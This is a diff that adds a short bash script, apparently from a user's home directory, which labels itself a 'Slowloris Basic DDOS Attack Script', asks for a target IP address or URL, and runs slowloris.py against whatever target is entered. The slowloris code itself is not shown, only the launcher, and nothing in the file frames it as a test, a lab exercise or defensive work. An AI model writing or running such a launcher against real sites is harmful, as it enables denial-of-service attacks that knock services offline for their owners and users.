@@ -1,0 +1,5 @@
+#!/bin/bash
+cd /home/will/slowloris
+echo "Slowloris Basic DDOS Attack Script"
+read -p "Enter the ip address or url of the target website/device: " input
+python3 slowloris.py $input
